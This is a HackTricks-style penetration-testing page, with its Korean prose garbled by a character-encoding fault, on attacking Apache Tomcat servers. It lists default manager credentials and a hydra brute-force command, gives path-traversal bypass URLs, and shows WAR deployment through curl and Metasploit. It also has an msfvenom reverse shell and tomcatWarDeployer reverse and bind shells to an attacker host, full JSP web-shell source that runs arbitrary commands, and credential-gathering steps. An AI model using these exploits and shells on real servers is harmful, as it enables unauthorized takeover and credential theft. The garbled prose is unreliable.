# Tomcat

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì„ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ì´ ë˜ëŠ” AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”**!</summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ì‹œë‚˜ìš”**? í˜¹ì€ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”, ì €í¬ì˜ ë…ì  [**NFT ì»¬ë ‰ì…˜**](https://opensea.io/collection/the-peass-family)
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **Discord ê·¸ë£¹**ì— **ê°€ì…**í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  ì‹¶ìœ¼ì‹œë‹¤ë©´** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ë¡œ PRì„ ì œì¶œ**í•˜ì„¸ìš”.

</details>

**Try Hard Security Group**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/kr/network-services-pentesting/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## ë°œê²¬

* ë³´í†µ **í¬íŠ¸ 8080**ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤.
* **ì¼ë°˜ì ì¸ í†°ìº£ ì˜¤ë¥˜:**

<figure><img src="../../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## ì—´ê±°

### **ë²„ì „ ì‹ë³„**

Apache Tomcatì˜ ë²„ì „ì„ ì°¾ìœ¼ë ¤ë©´ ê°„ë‹¨í•œ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```

### **ë§¤ë‹ˆì € íŒŒì¼ ìœ„ì¹˜**

**`/manager`** ë° **`/host-manager`** ë””ë ‰í† ë¦¬ì˜ ì •í™•í•œ ìœ„ì¹˜ë¥¼ ì‹ë³„í•˜ëŠ” ê²ƒì€ ì¤‘ìš”í•©ë‹ˆë‹¤. ì´ë“¤ í˜ì´ì§€ì˜ ì´ë¦„ì´ ë³€ê²½ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ë¬´ì°¨ë³„ ëŒ€ì… ê²€ìƒ‰ì´ ê¶Œì¥ë©ë‹ˆë‹¤.

### **ì‚¬ìš©ìëª… ì—´ê±°**

Tomcat ë²„ì „ 6ë³´ë‹¤ ì˜¤ë˜ëœ ê²½ìš°, ë‹¤ìŒì„ í†µí•´ ì‚¬ìš©ìëª…ì„ ì—´ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```bash
msf> use auxiliary/scanner/http/tomcat_enum
```

### **ê¸°ë³¸ ìê²© ì¦ëª…**

**`/manager/html`** ë””ë ‰í† ë¦¬ëŠ” WAR íŒŒì¼ì˜ ì—…ë¡œë“œ ë° ë°°í¬ë¥¼ í—ˆìš©í•˜ì—¬ ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— íŠ¹íˆ ë¯¼ê°í•©ë‹ˆë‹¤. ì´ ë””ë ‰í† ë¦¬ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ ê¸°ë³¸ HTTP ì¸ì¦ìœ¼ë¡œ ë³´í˜¸ë©ë‹ˆë‹¤:

* admin:admin
* tomcat:tomcat
* admin:
* admin:s3cr3t
* tomcat:s3cr3t
* admin:tomcat

ì´ëŸ¬í•œ ìê²© ì¦ëª…ì€ ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```

ë‹¤ë¥¸ ì£¼ëª©í• ë§Œí•œ ë””ë ‰í† ë¦¬ëŠ” \*\*`/manager/status`\*\*ì´ë©°, ì´ëŠ” Tomcat ë° OS ë²„ì „ì„ í‘œì‹œí•˜ì—¬ ì·¨ì•½ì  ì‹ë³„ì„ ë•ìŠµë‹ˆë‹¤.

### **ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©**

manager ë””ë ‰í† ë¦¬ì— ëŒ€í•œ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ì‹œë„í•˜ë ¤ë©´ ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

## ì¼ë°˜ ì·¨ì•½ì 

### **ë¹„ë°€ë²ˆí˜¸ ë°±íŠ¸ë ˆì´ìŠ¤ ë…¸ì¶œ**

`/auth.jsp`ì— ì•¡ì„¸ìŠ¤í•˜ë©´ ìš´ì¢‹ê²Œ ë¹„ë°€ë²ˆí˜¸ê°€ ë°±íŠ¸ë ˆì´ìŠ¤ì— ë…¸ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **ì´ì¤‘ URL ì¸ì½”ë”©**

`mod_jk`ì˜ CVE-2007-1860 ì·¨ì•½ì ì€ ì´ì¤‘ URL ì¸ì½”ë”© ê²½ë¡œ ì´ë™ì„ í—ˆìš©í•˜ì—¬ íŠ¹ë³„íˆ ë§Œë“¤ì–´ì§„ URLì„ í†µí•´ ê´€ë¦¬ ì¸í„°í˜ì´ìŠ¤ì— ë¬´ë‹¨ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

Tomcatì˜ ê´€ë¦¬ ì›¹ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ë©´ ë‹¤ìŒ ê²½ë¡œë¡œ ì´ë™í•˜ì‹­ì‹œì˜¤: `pathTomcat/%252E%252E/manager/html`

### /examples

Apache Tomcat ë²„ì „ 4.xì—ì„œ 7.xì—ëŠ” ì •ë³´ ë…¸ì¶œ ë° í¬ë¡œìŠ¤ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ…(XSS) ê³µê²©ì— ì·¨ì•½í•œ ì˜ˆì œ ìŠ¤í¬ë¦½íŠ¸ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ìŠ¤í¬ë¦½íŠ¸ëŠ” ë¬´ë‹¨ ì•¡ì„¸ìŠ¤ ë° ì ì¬ì ì¸ ì•…ìš©ì„ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤. [ìì„¸í•œ ì •ë³´ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **ê²½ë¡œ ì´ë™ ê³µê²©**

ì¼ë¶€ [**Tomcatì˜ ì·¨ì•½í•œ êµ¬ì„±**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)ì—ì„œëŠ” ê²½ë¡œ `/..;/`ë¥¼ ì‚¬ìš©í•˜ì—¬ Tomcatì˜ ë³´í˜¸ëœ ë””ë ‰í† ë¦¬ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒ ê²½ë¡œë¡œ **Tomcat ê´€ë¦¬ì** í˜ì´ì§€ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `www.vulnerable.com/lalala/..;/manager/html`

ì´ ìš”ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ë³´í˜¸ëœ ê²½ë¡œë¥¼ ìš°íšŒí•˜ëŠ” **ë˜ ë‹¤ë¥¸ ë°©ë²•**ì€ `http://www.vulnerable.com/;param=value/manager/html`ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

## RCE

ë§ˆì§€ë§‰ìœ¼ë¡œ, Tomcat ì›¹ ì‘ìš©í”„ë¡œê·¸ë¨ ê´€ë¦¬ìì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆë‹¤ë©´ **.war íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ë°°í¬í•˜ì—¬ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì œí•œ ì‚¬í•­

**ê¶Œí•œì´ ì¶©ë¶„í•˜ë‹¤ë©´**(ì—­í• : **admin**, **manager** ë° **manager-script**), WARë¥¼ ë°°í¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì„¸ë¶€ ì •ë³´ëŠ” ì¼ë°˜ì ìœ¼ë¡œ `/usr/share/tomcat9/etc/tomcat-users.xml`ì— ì •ì˜ëœ \_tomcat-users.xml\_ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë²„ì „ì— ë”°ë¼ ë‹¤ë¦„) (ìì„¸í•œ ë‚´ìš©ì€ [POST](./#post) ì„¹ì…˜ ì°¸ì¡°).

```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```

### Metasploit

### Metasploit

```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

### MSFVenom Reverse Shell

1. ë°°í¬í•  war íŒŒì¼ ìƒì„±:

```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```

### `revshell.war` íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì ‘ê·¼ (`/revshell/`):

### [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°”ì¸ë“œ ë° ì—­ì‰˜ì„ ì„¤ì •í•©ë‹ˆë‹¤.

ì¼ë¶€ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì˜ˆ: sunì˜ ì´ì „ ë²„ì „)

#### ë‹¤ìš´ë¡œë“œ

```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```

#### ë¦¬ë²„ìŠ¤ ì‰˜

```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```

#### ë°”ì¸ë“œ ì‰˜

```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```

### [Culsterd](https://github.com/hatRiot/clusterd) ì‚¬ìš©í•˜ê¸°

```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```

### ìˆ˜ë™ ë°©ë²• - ì›¹ ì‰˜

ë‹¤ìŒ [ì½˜í…ì¸ ](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)ë¡œ **index.jsp**ë¥¼ ìƒì„±í•˜ì„¸ìš”:

```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```

### ìˆ˜ë™ ë°©ë²• 2

[JSP ì›¹ ì‰˜](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)ì„ ê°€ì ¸ì™€ WAR íŒŒì¼ì„ ìƒì„±í•˜ì‹­ì‹œì˜¤:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```

## POST

í†°ìº£ ìê²© ì¦ëª… íŒŒì¼ì˜ ì´ë¦„ì€ \_tomcat-users.xml\_ì…ë‹ˆë‹¤.

```bash
find / -name tomcat-users.xml 2>/dev/null
```

ë‹¤ë¥¸ Tomcat ìê²© ì¦ëª…ì„ ìˆ˜ì§‘í•˜ëŠ” ë°©ë²•:

```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```

## ë‹¤ë¥¸ í†°ìº£ ìŠ¤ìºë‹ ë„êµ¬

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## ì°¸ê³  ìë£Œ

* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)

**Try Hard Security Group**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/kr/network-services-pentesting/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ ì œë¡œë¶€í„° AWS í•´í‚¹ì„ ì „ë¬¸ê°€ë¡œ ë°°ìš°ì„¸ìš”</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? ê·€í•˜ì˜ íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ì‹œë‚˜ìš”? ë˜ëŠ” PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”?** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)**ë¥¼ í™•ì¸í•˜ì„¸ìš”!**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™¹**](https://peass.creator-spring.com)ì„ ë°›ìœ¼ì„¸ìš”
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ì— ì œì¶œí•˜ì„¸ìš”.**

</details>
